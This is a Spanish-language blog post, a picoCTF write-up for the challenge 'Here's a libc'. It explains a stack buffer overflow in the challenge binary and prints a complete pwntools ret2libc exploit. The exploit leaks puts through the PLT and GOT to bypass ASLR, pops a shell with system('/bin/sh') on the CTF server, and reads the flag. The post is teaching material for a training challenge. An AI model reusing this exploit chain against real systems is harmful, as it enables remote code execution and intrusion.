<!DOCTYPE html> <!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]--> <!--[if (IE 7)&!(IEMobile)]><html class="no-js lt-ie9 lt-ie8"><![endif]--> <!--[if (IE 8)&!(IEMobile)]><html class="no-js lt-ie9"><![endif]--> <!--[if gt IE 8]><!--> <html class="no-js"><!--<![endif]--> <head> <meta charset="UTF-8"> <meta content="text/html; charset=UTF-8" http-equiv="Content-Type"> <meta http-equiv=X-UA-Compatible content="IE=edge,chrome=1"> <title>picoCTF Here's a libc - ret2libc y bypass ASLR &#8211; c4rta</title> <meta name="description" content="Soy Omar, un amante de la ciberseguridad y las radiocomunicaciones"> <meta name="keywords" content="Explotacion Binaria, ret2libc, ROP, ASLR bypass"> <!-- Twitter Cards --> <meta name="twitter:card" content="summary"> <meta name="twitter:image" content="http://localhost:4000/assets/img/logo8.gif"> <meta name="twitter:title" content="picoCTF Here's a libc - ret2libc y bypass ASLR"> <meta name="twitter:description" content="Realizaremos un ataque ret2libc para hacer bypass de NX, ademas usaremos puts en GOT y PLT para lekear valores y evadir el ASLR"> <meta name="twitter:site" content="@_c4rta_"> <meta name="twitter:creator" content="@_c4rta_"> <!-- Open Graph --> <meta property="og:locale" content="en_US"> <meta property="og:type" content="article"> <meta property="og:title" content="picoCTF Here's a libc - ret2libc y bypass ASLR"> <meta property="og:description" content="Realizaremos un ataque ret2libc para hacer bypass de NX, ademas usaremos puts en GOT y PLT para lekear valores y evadir el ASLR"> <meta property="og:url" content="http://localhost:4000/picoCTF-here's-a-libc/"> <meta property="og:site_name" content="c4rta"> <meta property="og:image" content="http://localhost:4000/assets/img/logo8.gif"> <link rel="canonical" href="http://localhost:4000/picoCTF-here's-a-libc/"> <link href="http://localhost:4000/feed.xml" type="application/atom+xml" rel="alternate" title="c4rta Feed"> <!-- Handheld --> <meta name="HandheldFriendly" content="True"> <meta name="MobileOptimized" content="320"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- CSS --> <link rel="stylesheet" href="http://localhost:4000/assets/css/main.css"> <!-- JS --> <script src="http://localhost:4000/assets/js/modernizr-3.3.1.custom.min.js"></script> <!-- Favicons --> <link rel="apple-touch-icon" href="http://localhost:4000/assets/img/favicons/apple-icon-precomposed.png"> <link rel="apple-touch-icon" sizes="72x72" href="http://localhost:4000/assets/img/favicons/apple-icon-72x72.png"> <link rel="apple-touch-icon" sizes="114x114" href="http://localhost:4000/assets/img/favicons/apple-icon-114x114.png"> <link rel="apple-touch-icon" sizes="144x144" href="http://localhost:4000/assets/img/favicons/apple-icon-144x144.png"> <link rel="shortcut icon" type="image/png" href="http://localhost:4000/favicon.png" /> <link rel="shortcut icon" href="http://localhost:4000/favicon.ico" /> <!-- Background Image --> <style type="text/css">body {background-image:url(http://localhost:4000/assets/img/placeholder-big.jpg); background-repeat: no-repeat; background-size: cover; }</style> <!-- Post Feature Image --> </head> <body> <nav id="dl-menu" class="dl-menuwrapper" role="navigation"> <button class="dl-trigger">Open Menu</button> <ul class="dl-menu"> <li><a href="http://localhost:4000/">Home</a></li> <li> <a href="#">About</a> <ul class="dl-submenu"> <li> <img src="http://localhost:4000/assets/img/logo8.gif" alt="c4rta photo" class="author-photo"> <h4>c4rta</h4> <p>Soy Omar, un amante de la ciberseguridad y las radiocomunicaciones</p> </li> <li><a href="http://localhost:4000/about/"><span class="btn btn-inverse">Learn More</span></a></li> <li> <a href="http://twitter.com/_c4rta_" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-twitter-square"></i> Twitter</a> </li> <li> <a href="http://github.com/ic4rta" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-github"></i> Github</a> </li> </ul><!-- /.dl-submenu --> </li> <li> <a href="#">Posts</a> <ul class="dl-submenu"> <li><a href="http://localhost:4000/posts/">All Posts</a></li> <li><a href="http://localhost:4000/tags/">All Tags</a></li> </ul> </li> </ul><!-- /.dl-menu --> </nav><!-- /.dl-menuwrapper --> <!-- Header --> <header class="header" role="banner"> <div class="wrapper animated fadeIn"> <div class="content"> <div class="post-title "> <h1>picoCTF Here's a libc - ret2libc y bypass ASLR</h1> <h4>24 Jan 2023</h4> <p class="reading-time"> <i class="fa fa-clock-o"></i> Reading time ~6 minutes </p><!-- /.entry-reading-time --> <a class="btn zoombtn" href="http://localhost:4000/posts/"> <i class="fa fa-chevron-left"></i> </a> </div> <p>Realizaremos un ataque ret2libc para hacer bypass de NX, ademas usaremos puts en GOT y PLT para lekear valores y evadir el ASLR</p> <h2 class="lead" id="analisis">Analisis</h2> <p>Para no hacerlo tan largo por que no es la gran cosa el codigo, me voy a ir directamente a la funcion importante que se llama <code class="language-plaintext highlighter-rouge">do_stuff</code>, como ingrese el codigo a radare quiero resalar que:</p> <p>La variable que toma nuestro input de esta declarando como <code class="language-plaintext highlighter-rouge">var uint32_t var_8h @ rbp-0x8</code> la cual recibe 112 bytes</p> <p>La funcion que recibe nuestro input <code class="language-plaintext highlighter-rouge">scanf</code> no esta limitando los caracteres que le metemos:</p> <div class="language-plaintext highlighter-rouge"><pre class="highlight"><code>0x004006fe      e87dfeffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│           0x00400703      488d857fffff.  lea rax, [var_81h]
│           0x0040070a      4889c6         mov rsi, rax
│           0x0040070d      488d3d260200.  lea rdi, [0x0040093a]       ; "%c" ; const char *format
│           0x00400714      b800000000     mov eax, 0
</code></pre></div> <p>Y ademas en esto de arriba se esta usando la variable <code class="language-plaintext highlighter-rouge">var_81h</code> ya que nuestro input lo transforma de minusculas a mayusculas y viceversa</p> <h2 id="crafteando-el-exploit---parte-1">Crafteando el exploit - parte 1</h2> <h3 id="sacando-el-offset-de-el-rip">Sacando el offset de el RIP</h3> <p>Una vez sabiendo que tenemos un buffer de 112 y no hay un limite para nuestro input entonces pasaremos a sacer el offset de el RIP</p> <p>Con gdb y el comando <code class="language-plaintext highlighter-rouge">cyclic 200</code> generare 200 bytes que le pasare como input al programa, una vez que pete para sacar el desplazamiento para llegar al RIP podemos usar el offset del RBP y sumarle 8 o tomar 8 bytes de el RSP, yo tomare 8 de el RSP y queda asi:</p> <div class="language-plaintext highlighter-rouge"><pre class="highlight"><code>pwndbg&gt; cyclic -l raaaaaaa
Lookup value: b'raaaaaaa'
136
</code></pre></div> <p>Y el desplazamiento para llegar al RIP es 136.</p> <p>Ahora, el binario tiene NX, asi que no podemos ejecutar una shellcode en el stack asi que podemos recurrir a tecnicas que usen ROP, como ret2libc, y lo mas clasico es sacar la direccion de <code class="language-plaintext highlighter-rouge">system</code> y <code class="language-plaintext highlighter-rouge">/bin/sh</code>, el problema es que tenemos ASLR asi que podemos hacer uso de un clasico, hacer uso de la funcion <code class="language-plaintext highlighter-rouge">puts</code> para lekear valores, para esto tenemos que sacar la direccion de <code class="language-plaintext highlighter-rouge">puts</code> en PLT y como esta funcion espera un argumento, podemos usar <code class="language-plaintext highlighter-rouge">puts</code> pero ahora en GOT y otro clasico es usar <code class="language-plaintext highlighter-rouge">setbuf</code> en GOT pero en esta caso usare <code class="language-plaintext highlighter-rouge">puts</code>, ademas como estamos en x64 tenemos que poner <code class="language-plaintext highlighter-rouge">RDI</code> como primer argumento en una funcion</p> <h3 id="puts-en-plt-y-puts-en-got">puts en PLT y puts en GOT</h3> <p>Para sacar puts en PLT podemos usar: <code class="language-plaintext highlighter-rouge">objdump -d vuln_patched | grep puts</code> y esto nos da:</p> <div class="language-plaintext highlighter-rouge"><pre class="highlight"><code>0000000000400540 &lt;puts@plt&gt;:
  400540:	ff 25 d2 0a 20 00    	jmp    *0x200ad2(%rip)        # 601018 &lt;puts@GLIBC_2.2.5&gt;
  400769:	e8 d2 fd ff ff       	call   400540 &lt;puts@plt&gt;
  400891:	e8 aa fc ff ff       	call   400540 &lt;puts@plt&gt;
</code></pre></div> <p>Y vamos a ocupar la <code class="language-plaintext highlighter-rouge">400540</code></p> <p>Y para sacer puts en GOT podemos usar: <code class="language-plaintext highlighter-rouge">objdump -R vuln_patched | grep puts</code>:</p> <p><code class="language-plaintext highlighter-rouge">0000000000601018 R_X86_64_JUMP_SLOT puts@GLIBC_2.2.5</code></p> <p>Y es la <code class="language-plaintext highlighter-rouge">601018</code></p> <h3 id="pop-rdi">pop rdi</h3> <p>Para sacar esto podemos hacer uso de <code class="language-plaintext highlighter-rouge">ropper</code>, <code class="language-plaintext highlighter-rouge">ROPGadget</code> o radare con el comando <code class="language-plaintext highlighter-rouge">/R</code>, en mi caso usare ropper con el comando <code class="language-plaintext highlighter-rouge">ropper -f vuln_patched | grep 'rdi'</code> y usaremos este <code class="language-plaintext highlighter-rouge">0x0000000000400913: pop rdi; ret;</code></p> <p>Esto lo hacemos ya que debemos de meter puts en GOT en rdi</p> <h3 id="direccion-de-main">Direccion de main</h3> <p>Otra cosa importante es la direccion de main, ya que con esta el programa sabra a donde regresar o no petara</p> <div class="language-plaintext highlighter-rouge"><pre class="highlight"><code>readelf -s vuln | grep main                                                                                                                          ─╯
    63: 0000000000400771   305 FUNC    GLOBAL DEFAULT   13 main
</code></pre></div> <h3 id="ejecutando-el-exploit">Ejecutando el exploit</h3> <div class="language-py highlighter-rouge"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">host</span> <span class="o">=</span> <span class="s">"mercury.picoctf.net"</span>
<span class="n">puerto</span> <span class="o">=</span> <span class="mi">42072</span> <span class="c">#&lt;-- Esto lo cambias</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">puerto</span><span class="p">)</span>

<span class="n">padding</span> <span class="o">=</span> <span class="n">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">136</span>
<span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x400913</span>
<span class="n">puts_got</span> <span class="o">=</span> <span class="mh">0x601018</span>
<span class="n">puts_plt</span> <span class="o">=</span> <span class="mh">0x400540</span>
<span class="n">main</span> <span class="o">=</span> <span class="mh">0x400771</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">b</span><span class="s">'WeLcOmE To mY EcHo sErVeR!</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>

<span class="n">puts</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">f</span><span class="s">"Direccion de puts en tiempo de ejecucion: {hex(puts)}"</span><span class="p">)</span>
</code></pre></div> <p>Ahora ya tenemos la direccion de <code class="language-plaintext highlighter-rouge">puts</code> en tiempo de ejecucion:</p> <div class="language-bash highlighter-rouge"><pre class="highlight"><code>python3 exploit.py                                                ─╯
<span class="o">[</span>+] Opening connection to mercury.picoctf.net on port 42072: Done
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Direccion de puts en tiempo de ejecucion: 0x7f6d50592a30
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Closed connection to mercury.picoctf.net port 42072
</code></pre></div> <h2 id="crafteando-el-exploit---parte-2">Crafteando el exploit - parte 2</h2> <h3 id="direccion-base-de-libc">Direccion base de libc</h3> <p>Para esto tenemos que sacar el offset de puts en libc y restarselo a la direccion de puts en tiempo de ejecucion</p> <p>Con el comando: <code class="language-plaintext highlighter-rouge">readelf -s libc.so.6 | grep puts</code> podemos sacar el offset de puts en libc:</p> <p><code class="language-plaintext highlighter-rouge">422: 0000000000080a30 512 FUNC WEAK DEFAULT 13 puts@@GLIBC_2.2.5</code></p> <p>El cual es: <code class="language-plaintext highlighter-rouge">80a30</code></p> <div class="language-py highlighter-rouge"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">host</span> <span class="o">=</span> <span class="s">"mercury.picoctf.net"</span>
<span class="n">puerto</span> <span class="o">=</span> <span class="mi">42072</span> <span class="c">#&lt;-- Esto lo cambias</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">puerto</span><span class="p">)</span>

<span class="n">padding</span> <span class="o">=</span> <span class="n">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">136</span>
<span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x400913</span>
<span class="n">puts_got</span> <span class="o">=</span> <span class="mh">0x601018</span>
<span class="n">puts_plt</span> <span class="o">=</span> <span class="mh">0x400540</span>
<span class="n">main</span> <span class="o">=</span> <span class="mh">0x400771</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">b</span><span class="s">'WeLcOmE To mY EcHo sErVeR!</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>

<span class="n">puts</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">f</span><span class="s">"Direccion de puts en tiempo de ejecucion: {hex(puts)}"</span><span class="p">)</span>

<span class="n">offset_puts</span> <span class="o">=</span> <span class="mh">0x80a30</span>

<span class="n">libc</span> <span class="o">=</span> <span class="n">puts</span> <span class="o">-</span> <span class="n">offset_puts</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">f</span><span class="s">'Direccion base de libc: {hex(libc)}'</span><span class="p">)</span>  
</code></pre></div> <p>Ahora ya tenemos la direccion base de libc:</p> <div class="language-bash highlighter-rouge"><pre class="highlight"><code>python3 exploit.py                                                ─╯
<span class="o">[</span>+] Opening connection to mercury.picoctf.net on port 42072: Done
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Direccion de puts en tiempo de ejecucion: 0x7f9fa002ca30
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Direccion base de libc: 0x7f9f9ffac000
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Closed connection to mercury.picoctf.net port 42072
</code></pre></div> <h3 id="direccion-de-system-y-binsh">Direccion de system y /bin/sh</h3> <p>System:</p> <div class="language-plaintext highlighter-rouge"><pre class="highlight"><code>readelf -s libc.so.6 | grep system                                       ─╯
  1403: 000000000004f4e0    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
</code></pre></div> <p>/bin/sh:</p> <div class="language-plaintext highlighter-rouge"><pre class="highlight"><code>strings -atx libc.so.6 | grep /bin/sh                                                                                                                ─╯
 1b40fa /bin/sh
</code></pre></div> <p>Esto lo hacemos por que debemos de llamar a system con /bin/sh, y para eso debemos de usar otra vez <code class="language-plaintext highlighter-rouge">pop rdi</code></p> <p>Adicionalmente ocupamos la direccion de <code class="language-plaintext highlighter-rouge">ret</code> antes de llamar a system por cuestiones de stack alignment (la direccion la saque con ropper)</p> <h3 id="exploit-final">Exploit final</h3> <div class="language-py highlighter-rouge"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">host</span> <span class="o">=</span> <span class="s">"mercury.picoctf.net"</span>
<span class="n">puerto</span> <span class="o">=</span> <span class="mi">42072</span> <span class="c">#&lt;-- Esto lo cambias</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">puerto</span><span class="p">)</span>

<span class="n">padding</span> <span class="o">=</span> <span class="n">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">136</span>
<span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x400913</span>
<span class="n">puts_got</span> <span class="o">=</span> <span class="mh">0x601018</span>
<span class="n">puts_plt</span> <span class="o">=</span> <span class="mh">0x400540</span>
<span class="n">main</span> <span class="o">=</span> <span class="mh">0x400771</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">b</span><span class="s">'WeLcOmE To mY EcHo sErVeR!</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>

<span class="n">puts</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">f</span><span class="s">"Direccion de puts en tiempo de ejecucion: {hex(puts)}"</span><span class="p">)</span>

<span class="n">offset_puts</span> <span class="o">=</span> <span class="mh">0x80a30</span>

<span class="n">libc</span> <span class="o">=</span> <span class="n">puts</span> <span class="o">-</span> <span class="n">offset_puts</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">f</span><span class="s">'Direccion base de libc: {hex(libc)}'</span><span class="p">)</span>  

<span class="n">offset_system</span> <span class="o">=</span> <span class="mh">0x4f4e0</span>
<span class="n">offset_bin_sh</span> <span class="o">=</span> <span class="mh">0x1b40fa</span>

<span class="n">system</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="n">offset_system</span>
<span class="n">bin_sh</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="n">offset_bin_sh</span> 

<span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40052e</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div> <h3 id="flag">Flag</h3> <p>Y ahora ya tenemos la flag:</p> <div class="language-bash highlighter-rouge"><pre class="highlight"><code>python3 exploit.py                                                ─╯
<span class="o">[</span>+] Opening connection to mercury.picoctf.net on port 42072: Done
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Direccion de puts en tiempo de ejecucion: 0x7f8fa1699a30
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Direccion base de libc: 0x7f8fa1619000
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
WeLcOmE To mY EcHo sErVeR!
AaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAAAAAAAAAAAAAAAAAAAAd
<span class="gp">$ </span>cat flag.txt
picoCTF<span class="o">{</span>1_&lt;3_sm4sh_st4cking_3a9ee516616d21b3<span class="o">}</span>
<span class="gp">$ </span>whoami
here-s-a-libc_0
</code></pre></div> <p>Eso ha sido todo, gracias por leer ❤</p> <p><img src="/assets/img/hereLibc/waifu.gif" alt="" /></p> <div class="entry-meta"> <br> <hr> <span class="entry-tags"><a href="http://localhost:4000/tags/#Explotacion Binaria" title="Pages tagged Explotacion Binaria" class="tag"><span class="term">Explotacion Binaria</span></a><a href="http://localhost:4000/tags/#ret2libc" title="Pages tagged ret2libc" class="tag"><span class="term">ret2libc</span></a><a href="http://localhost:4000/tags/#ROP" title="Pages tagged ROP" class="tag"><span class="term">ROP</span></a><a href="http://localhost:4000/tags/#ASLR bypass" title="Pages tagged ASLR bypass" class="tag"><span class="term">ASLR bypass</span></a></span> <span class="social-share"> <a href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/picoCTF-here's-a-libc/" title="Share on Facebook" class="tag"> <span class="term"><i class="fa fa-facebook-square"></i> Share</span> </a> <a href="https://twitter.com/intent/tweet?text=http://localhost:4000/picoCTF-here's-a-libc/" title="Share on Twitter" class="tag"> <span class="term"><i class="fa fa-twitter-square"></i> Tweet</span> </a> <a href="https://plus.google.com/share?url=http://localhost:4000/picoCTF-here's-a-libc/" title="Share on Google+" class="tag"> <span class="term"><i class="fa fa-google-plus-square"></i> +1</span> </a> </span> <div style="clear:both"></div> </div> </div> </div> <!----> <section id="utterances_thread" class="animated fadeInUp"> <!-- <script src="https://giscus.app/client.js" data-repo="ic4rta/ic4rta.github.io" data-repo-id="R_kgDOIyhU8A" data-category="Publicaciones" data-category-id="DIC_kwDOIyhU8M4CWjpB" data-mapping="pathname" data-strict="0" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="light" data-lang="en" crossorigin="anonymous" async> </script> --> <script src="https://utteranc.es/client.js" repo="ic4rta/ic4rta.github.io" issue-term="pathname" label="Publicaciones" theme="github-light" crossorigin="anonymous" async> </script> </section> </header> <!-- JS --> <script src="http://localhost:4000/assets/js/jquery-1.12.0.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.dlmenu.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.goup.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.magnific-popup.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.fitvid.min.js"></script> <script src="http://localhost:4000/assets/js/scripts.js"></script> <script type="text/javascript"> var disqus_shortname = 'https-ic4rta-github-io'; (function() { var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true; dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js'; (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq); })(); (function () { var s = document.createElement('script'); s.async = true; s.type = 'text/javascript'; s.src = '//' + disqus_shortname + '.disqus.com/count.js'; (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s); }()); </script> <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript> <!-- MathJax --> <script async src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script> </body> </html>
